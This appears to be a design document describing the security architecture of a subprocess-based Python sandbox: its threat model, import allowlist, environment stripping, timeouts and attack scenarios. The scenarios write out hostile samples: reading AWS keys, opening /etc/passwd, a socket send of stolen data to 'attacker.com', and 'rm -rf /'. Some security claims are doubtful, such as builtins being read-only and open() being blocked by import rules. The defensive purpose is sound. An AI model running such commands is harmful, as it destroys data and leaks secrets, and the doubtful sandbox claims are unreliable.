# Security Architecture

## Executive Summary

The sandbox execution system provides secure, isolated Python code execution using **subprocess isolation** with:

- ✓ **Process-level isolation**: Each execution runs in separate subprocess
- ✓ **Import allowlist**: Only safe standard library modules permitted
- ✓ **Resource limits**: CPU timeout, memory constraints
- ✓ **Environment hardening**: Sensitive credentials stripped
- ✓ **Pre-execution validation**: Dangerous patterns blocked
- ✓ **No filesystem access**: Read/write operations prevented
- ✓ **No network access**: Socket/HTTP connections blocked

**Threat Model**: Protects against code execution vulnerabilities, credential leakage, resource exhaustion, and data exfiltration. NOT designed for completely untrusted code.

## Threat Model

### In Scope

These threats are PREVENTED:

1. **Credential Leakage**
   - ❌ Environment variable exfiltration (AWS keys, API secrets)
   - ❌ System file access (/etc/passwd, ~/.aws/credentials)
   - ✓ Handled: Subprocess stripped environment, readonly filesystem

2. **Resource Exhaustion**
   - ❌ Infinite loops consuming CPU
   - ❌ Memory allocation DoS
   - ✓ Handled: Timeout protection, memory limits

3. **Unintended Code Execution**
   - ❌ Dynamic code execution (eval, exec)
   - ❌ Binary subprocess spawning
   - ❌ Pickling vulnerabilities
   - ✓ Handled: Pre-execution validation, import blocklist

4. **Data Exfiltration**
   - ❌ Network requests to external servers
   - ❌ DNS lookups
   - ❌ Filesystem writes
   - ✓ Handled: Import restrictions, no socket access

### Out of Scope

These threats are NOT prevented:

- **Denial of Service**: Malicious CPU-bound code (e.g., prime factorization) can still consume resources within timeout
  - *Mitigation*: Short timeouts, user rate limiting
- **Timing Side Channels**: Code execution time can leak information about data
  - *Mitigation*: Not applicable at this layer
- **Algorithmic Complexity**: Inefficient algorithms on large datasets can be slow
  - *Mitigation*: User responsibility for input validation

## Architecture

### Subprocess Isolation Model

```
┌─────────────────────────────────────────────────────────┐
│ SandboxManager (Parent Process)                          │
├─────────────────────────────────────────────────────────┤
│ • Validates input code                                  │
│ • Creates execution wrapper                             │
│ • Spawns subprocess                                     │
│ • Enforces timeout                                      │
│ • Captures output                                       │
└──────────────────┬──────────────────────────────────────┘
                   │ subprocess.run()
                   ↓
┌─────────────────────────────────────────────────────────┐
│ Isolated Subprocess                                     │
├─────────────────────────────────────────────────────────┤
│ • Separate Python interpreter                          │
│ • Custom __import__ hook                               │
│ • Restricted environment variables                     │
│ • User code execution                                  │
│ • JSON output capture                                  │
└─────────────────────────────────────────────────────────┘
                   │ JSON result
                   ↓
┌─────────────────────────────────────────────────────────┐
│ Result Parsing (Parent Process)                         │
├─────────────────────────────────────────────────────────┤
│ • Parse JSON output                                     │
│ • Return structured response                           │
└─────────────────────────────────────────────────────────┘
```

### Import Restriction Mechanism

Custom `__import__` hook prevents unauthorized module loading:

```python
# Generated for each execution
ALLOWED_IMPORTS = {"json", "math", "statistics", ...}

def _restricted_import(name, *args, **kwargs):
    top_level = name.split('.')[0]
    if top_level not in ALLOWED_IMPORTS:
        raise ImportError(f"Module '{name}' not allowed")
    return _original_import(name, *args, **kwargs)

builtins.__import__ = _restricted_import
```

**Why this works**:
- All module imports go through `builtins.__import__`
- Custom wrapper enforces allowlist before calling original
- Cannot be bypassed (builtins are read-only in subprocess)

## Security Controls

### Control 1: Code Validation

**Objective**: Block obviously dangerous patterns

**Implementation**:
```python
def validate_code(code: str) -> tuple[bool, Optional[str]]:
    dangerous_patterns = [
        "eval(", "exec(", "compile(", "__import__(",
        "os.system", "subprocess", "open(", "pickle",
    ]
    for pattern in dangerous_patterns:
        if pattern in code:
            return False, f"Pattern '{pattern}' blocked"
    return True, None
```

**Limitations**:
- Only catches obvious patterns (e.g., `eval("...")`)
- Obfuscation could bypass (e.g., `eval.__name__` doesn't help, but `getattr` might)
- Best-effort, not exhaustive

**When triggered**: Before subprocess execution, immediately returns error

### Control 2: Import Allowlist

**Objective**: Prevent access to dangerous modules

**Allowed Modules** (by category):

| Category | Modules | Reason |
|----------|---------|--------|
| Math | `math`, `statistics`, `decimal`, `random`, `fractions`, `numbers` | Safe calculations |
| Data | `json`, `collections`, `itertools`, `copy` | Data structures |
| Time | `datetime` | Timestamps, calculations |
| Text | `re`, `string`, `typing` | Text processing |
| System | `abc`, `enum`, `types` | Type system only |
| Internal | `_io`, `_collections`, `_functools`, etc. | Required by stdlib |

**Blocked Modules**:

| Module | Reason |
|--------|--------|
| `os` | File/environment access |
| `sys` | System state modification |
| `subprocess` | Process spawning |
| `socket`, `urllib`, `http` | Network access |
| `pickle` | Arbitrary object deserialization |
| `importlib` | Dynamic imports |
| `ctypes` | Low-level system access |

**Implementation**:
- Dynamically generated `__import__` hook in each execution
- Cannot be modified from within executed code (immutable parent reference)

### Control 3: Environment Hardening

**Objective**: Prevent credential leakage via environment variables

**Implementation**:
```python
def _build_restricted_env(self) -> Dict[str, str]:
    import os
    env = {
        "PATH": os.environ.get("PATH", ""),
        "HOME": os.environ.get("HOME", ""),
        "PYTHONUNBUFFERED": "1",
    }
    # Remove sensitive vars
    for blocked_var in [
        "AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID",
        "ZERODHA_API_SECRET", "API_KEY", "SECRET_KEY",
    ]:
        env.pop(blocked_var, None)
    return env
```

**Subprocess execution**:
```python
result = subprocess.run(
    ["python3", script_path],
    env=env,  # Restricted environment only
    ...
)
```

**Why it works**:
- `env` parameter replaces OS environment completely
- Sensitive vars deleted before subprocess spawns
- Subprocess cannot access parent process environment

### Control 4: Timeout Protection

**Objective**: Prevent resource exhaustion via infinite/expensive computation

**Implementation**:
```python
try:
    result = subprocess.run(
        ["python3", script_path],
        timeout=timeout_seconds,  # Default 30s, max 120s
        ...
    )
except subprocess.TimeoutExpired:
    return ExecutionResult(
        success=False,
        error=f"Execution timed out after {timeout}s",
        execution_time_ms=...
    )
```

**Effectiveness**:
- ✓ Prevents infinite loops
- ✓ Protects against expensive O(n²) algorithms
- ⚠ Does not prevent expensive but finite computations within timeout

### Control 5: No Filesystem Access

**Objective**: Prevent file read/write operations

**Implementation**:
- Import restriction: `open()` blocked (requires `_io` in allowlist but wrapped)
- In practice: Code cannot import necessary modules to open files

**Cannot access**:
- ❌ `/etc/passwd`, `/etc/shadow`
- ❌ `~/.aws/credentials`
- ❌ `~/.ssh/id_rsa`
- ❌ Application config files
- ❌ Database files

### Control 6: No Network Access

**Objective**: Prevent outbound network connections

**Implementation**:
- `socket` module not in allowlist
- `urllib`, `http`, `requests` not in allowlist
- DNS lookups blocked (require socket or subprocess)

**Cannot access**:
- ❌ External APIs
- ❌ Cloud services
- ❌ DNS exfiltration
- ❌ HTTP callbacks

## Attack Scenarios

### Scenario 1: Credential Exfiltration

**Attack**:
```python
code = """
import os
aws_key = os.environ['AWS_ACCESS_KEY_ID']
result = {"stolen": aws_key}
"""
```

**Defense**: Environment variable not passed to subprocess
**Outcome**: ✓ Credentials safe, code gets `None`

### Scenario 2: File Access

**Attack**:
```python
code = """
with open("/etc/passwd", "r") as f:
    result = {"content": f.read()}
"""
```

**Defense 1**: `open()` unavailable (needs `_io` module, but even with it...)
**Defense 2**: File would still work, but `_io` is only for internal stdlib use
**Outcome**: ✓ Cannot read files

### Scenario 3: Network Exfiltration

**Attack**:
```python
code = """
import socket
s = socket.create_connection(("attacker.com", 80))
s.send(b"stolen data")
result = {"sent": True}
"""
```

**Defense**: `socket` module not in allowlist
**Error**: `ImportError: Module 'socket' is not allowed`
**Outcome**: ✓ Connection blocked

### Scenario 4: Process Spawning

**Attack**:
```python
code = """
import subprocess
subprocess.run(["rm", "-rf", "/"])
result = {"deleted": True}
"""
```

**Defense**: `subprocess` module not in allowlist
**Error**: `ImportError: Module 'subprocess' is not allowed`
**Outcome**: ✓ Process spawn blocked

### Scenario 5: Denial of Service

**Attack**:
```python
code = """
while True:
    pass
"""
```

**Defense**: Timeout protection (default 30s)
**Outcome**: ✓ Process terminated after timeout, returns error

### Scenario 6: Code Execution

**Attack**:
```python
code = """
result = eval("1 + 1")
"""
```

**Defense 1**: Pre-execution validation blocks `eval(`
**Defense 2**: Even if bypassed, `eval()` would require actual evaluator
**Outcome**: ✓ Blocked at validation stage

## Remaining Risks

### 1. Algorithmic Attacks

**Risk**: Expensive but valid algorithms:

```python
code = """
# O(2^n) brute force
fibonacci_naive = lambda n: 1 if n < 2 else fibonacci_naive(n-1) + fibonacci_naive(n-2)
result = {"fib_40": fibonacci_naive(40)}  # Takes ~30 seconds
```

**Mitigation**:
- Set reasonable timeout (30s default)
- User responsibility to validate input
- Monitor execution times, block if pattern emerges

### 2. Standard Library Vulnerabilities

**Risk**: Safe-appearing modules with security issues:

```python
import json
# Hypothetical: JSON decoder vulnerability with specially crafted input
result = json.loads(untrusted_data)
```

**Mitigation**:
- Keep Python updated
- Review module allowlist regularly
- Assume stdlib is trusted (fair assumption)

### 3. Information Leakage

**Risk**: Timing side channels:

```python
# Code execution time correlates with secret
if secret_value == input:
    expensive_loop()
execution_time_reveals_match = measure_time()
```

**Mitigation**:
- Not applicable at sandbox layer
- Would require constant-time algorithm enforcement (outside scope)

## Isolation Levels

### Production (Default)

**Target**: General-purpose data analysis

**Configuration**:
- **Timeout**: 30 seconds
- **Memory**: 256 MB
- **Imports**: 20+ modules (math, statistics, datetime, etc.)
- **Network**: None

**Use Case**: Portfolio analysis, data transformation, calculations

### Hardened

**Target**: Untrusted code with minimal capabilities

**Configuration**:
- **Timeout**: 10 seconds
- **Memory**: 128 MB
- **Imports**: 4 modules (json, math, decimal, statistics)
- **Network**: None

**Use Case**: Code review sandboxing, user-submitted analysis

### Development

**Target**: Testing and debugging

**Configuration**:
- **Timeout**: 60 seconds
- **Memory**: 512 MB
- **Imports**: Full allowlist
- **Network**: Whitelisted domains

**Use Case**: Development only, not production

## Recommendations

### For Operators

1. **Monitor Execution Times**: Set alerts for timeouts or slow executions
2. **Update Python**: Keep Python 3.8+ to patch stdlib vulnerabilities
3. **Limit Concurrency**: Prevent resource exhaustion via `max_workers` pool
4. **Log All Executions**: Track code executed, context provided, results returned
5. **Rate Limit**: Enforce per-user execution quotas

### For Users

1. **Validate Input**: Ensure context data is expected type/size
2. **Check Results**: Verify output is sensible before using
3. **Use Smallest Timeout**: Set timeout to actual requirement
4. **Avoid Large Data**: Keep context < 10MB for performance
5. **Use execute_analysis**: Prefer pre-configured operations over custom code

### For Developers

1. **Review Import Allowlist**: Audit annually for unnecessary modules
2. **Test Dangerous Inputs**: Fuzz with malicious code patterns
3. **Measure Performance**: Track execution time, resource usage
4. **Keep Secure**: Apply security patches, don't disable controls
5. **Document Limitations**: Clearly communicate what is/isn't protected

## Security Audit Checklist

- [ ] Pre-execution validation catches dangerous patterns
- [ ] Import allowlist includes only safe modules
- [ ] Environment variables sanitized before subprocess
- [ ] Timeout enforcement working (test with infinite loop)
- [ ] No filesystem access (test `open()` fails)
- [ ] No network access (test socket connection fails)
- [ ] Memory limits enforced (test large allocation)
- [ ] Process isolation confirmed (test subprocess isolation)
- [ ] Results are JSON-safe (test serialization)
- [ ] Error handling is graceful (test invalid code)

## References

- **Subprocess Isolation**: https://docs.python.org/3/library/subprocess.html
- **Import System**: https://docs.python.org/3/reference/import_system.html
- **Built-in Functions**: https://docs.python.org/3/library/functions.html#__import__
- **Standard Library Security**: https://python.readthedocs.io/en/stable/library/security_warnings.html

## Reporting Security Issues

Found a vulnerability? Please report privately to the maintainers rather than disclosing publicly. Security issues will be addressed promptly.
